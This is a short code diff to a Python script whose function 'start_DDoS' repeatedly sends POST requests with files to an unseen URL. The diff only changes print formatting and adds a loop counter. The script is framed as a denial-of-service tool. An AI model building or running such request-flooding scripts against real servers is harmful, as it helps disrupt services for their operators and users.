@@ -14,10 +14,10 @@ def send_post():
 
 	rsp = post(url,files=files,data=data)
 
-	print(rsp)
+	print(rsp,end='')
 
 def start_DDoS(number_of_requests):
 	for i in range(number_of_requests):
 		send_post()
-
+		print('==>',i)
 start_DDoS(50)
